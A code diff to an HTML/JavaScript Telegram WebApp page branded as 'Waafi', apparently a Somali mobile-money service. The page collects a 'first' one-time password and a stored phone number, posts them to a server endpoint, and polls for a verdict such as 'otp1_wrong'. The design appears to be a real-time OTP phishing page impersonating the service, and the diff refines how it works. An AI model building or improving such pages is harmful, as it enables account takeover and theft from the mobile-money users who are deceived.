@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Waafi - OTP Kowaad</title>
 
-    <!-- ✅ FIXED TELEGRAM SCRIPT -->
+    <!-- FIXED: Proper Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -58,16 +58,15 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.05); 
             box-sizing: border-box;
         }
-        
+
         h2 { font-size: 24px; color: #222; margin-bottom: 15px; font-weight: 700; }
-        .instruction { color: #666; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
+        .instruction { color: #666; font-size: 15px; margin-bottom: 25px; }
 
         .otp-group { 
             display: flex; 
             justify-content: center; 
             gap: 8px; 
-            margin: 0 auto 30px auto; 
-            width: 100%;
+            margin-bottom: 30px; 
         }
 
         .otp-input { 
@@ -79,8 +78,6 @@
             font-size: 22px; 
             font-weight: bold; 
             outline: none; 
-            background: #fff;
-            color: #333;
         }
 
         .resend-text { color: #999; font-size: 14px; margin-bottom: 35px; }
@@ -94,9 +91,7 @@
             border-radius: 12px; 
             font-size: 16px; 
             font-weight: bold; 
-            text-transform: uppercase; 
             cursor: not-allowed;
-            transition: 0.3s;
         }
 
         .btn-verify.active { 
@@ -118,14 +113,13 @@
         .loader-circle::after { 
             content: ''; 
             width: 75px; height: 75px; 
-            border: 4px solid rgba(255, 255, 255, 0.3); 
+            border: 4px solid rgba(255,255,255,0.3); 
             border-top: 4px solid white; 
             border-radius: 50%; 
             animation: spin 1s linear infinite; 
         }
 
         @keyframes spin { 
-            0% { transform: rotate(0deg); } 
             100% { transform: rotate(360deg); } 
         }
 
@@ -137,8 +131,6 @@
             background: linear-gradient(to bottom, #82d13d, #a3e635); 
             padding: 60px 0;
             margin-top: auto; 
-            border-top-left-radius: 50% 30px; 
-            border-top-right-radius: 50% 30px; 
             text-align: center; 
             color: white;
         }
@@ -154,27 +146,27 @@
 
 <div class="card" id="inputSection">
     <h2>Xaqiijinta OTP-ga Kowaad</h2>
-    <p class="instruction">Geli OTP-ga kowaad ee loogu diray lambarkaaga</p>
-    
+    <p class="instruction">Geli OTP-ga kowaad</p>
+
     <div class="otp-group">
-        <input type="text" maxlength="1" class="otp-input">
-        <input type="text" maxlength="1" class="otp-input">
-        <input type="text" maxlength="1" class="otp-input">
-        <input type="text" maxlength="1" class="otp-input">
-        <input type="text" maxlength="1" class="otp-input">
-        <input type="text" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
     </div>
 
-    <p class="resend-text">Koodka mar kale u dir <span id="timer">60</span> ilbiriqsi</p>
+    <p class="resend-text">Koodka mar kale u dir <span id="timer">60</span>s</p>
 
     <button id="verifyBtn" class="btn-verify" onclick="handleVerification()" disabled>
-        XAQIIJI OTP-GA KOWAAD
+        XAQIIJI OTP
     </button>
 </div>
 
 <div class="card" id="loadingSection">
     <div class="loader-circle"></div>
-    <div class="green-header">Xaqiijinta OTP-ga</div>
+    <div class="green-header">Xaqiijinta...</div>
     <div class="wait-text">Fadlan sug...</div>
 </div>
 
@@ -188,53 +180,58 @@ const verifyBtn = document.getElementById('verifyBtn');
 const inputSection = document.getElementById('inputSection');
 const loadingSection = document.getElementById('loadingSection');
 const timerText = document.getElementById('timer');
-const toast = document.getElementById('successToast');
+
+let isSubmitting = false;
 
 window.onload = () => {
-    window.Telegram?.WebApp.ready();
-    window.Telegram?.WebApp.expand();
-
+    window.Telegram?.WebApp?.ready();
+    window.Telegram?.WebApp?.expand();
     startCountdown();
-
-    setTimeout(() => {
-        toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 4000);
-    }, 1000);
 };
 
 function startCountdown() {
     let count = 60;
     const interval = setInterval(() => {
-        count--;
         timerText.innerText = count;
-        if (count <= 0) clearInterval(interval);
+        count--;
+        if (count < 0) clearInterval(interval);
     }, 1000);
 }
 
-inputs.forEach((input, index) => {
+// OTP handling
+inputs.forEach((input, i) => {
     input.addEventListener('input', () => {
-        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
-        checkInputs();
+        input.value = input.value.replace(/[^0-9]/g, '');
+
+        if (input.value && i < inputs.length - 1) {
+            inputs[i + 1].focus();
+        }
+        check();
     });
 
     input.addEventListener('keydown', (e) => {
-        if (e.key === "Backspace" && !input.value && index > 0) {
-            inputs[index - 1].focus();
+        if (e.key === "Backspace" && !input.value && i > 0) {
+            inputs[i - 1].focus();
         }
     });
 });
 
-function checkInputs() {
-    const filled = [...inputs].every(input => input.value.length === 1);
+function check() {
+    const filled = [...inputs].every(i => i.value.length === 1);
     verifyBtn.disabled = !filled;
     verifyBtn.classList.toggle('active', filled);
 }
 
 async function handleVerification() {
-    let otpValue = "";
-    inputs.forEach(i => otpValue += i.value);
+    if (isSubmitting) return;
 
     const phone = localStorage.getItem('phone');
+    if (!phone) return alert("Phone not found");
+
+    let otp = "";
+    inputs.forEach(i => otp += i.value);
+
+    isSubmitting = true;
 
     inputSection.style.display = "none";
     loadingSection.style.display = "block";
@@ -242,8 +239,8 @@ async function handleVerification() {
     try {
         await fetch('/api/verify-first-otp', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone, otp: otpValue })
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone, otp })
         });
 
         const poll = setInterval(async () => {
@@ -257,18 +254,19 @@ async function handleVerification() {
 
             if (data.status === "otp1_wrong") {
                 clearInterval(poll);
-                alert("Koodka waa khalad");
+                alert("OTP waa khalad");
                 reset();
             }
-
-        }, 3000);
+        }, 2500);
 
     } catch (e) {
         console.error(e);
+        reset();
     }
 }
 
 function reset() {
+    isSubmitting = false;
     loadingSection.style.display = "none";
     inputSection.style.display = "block";
 
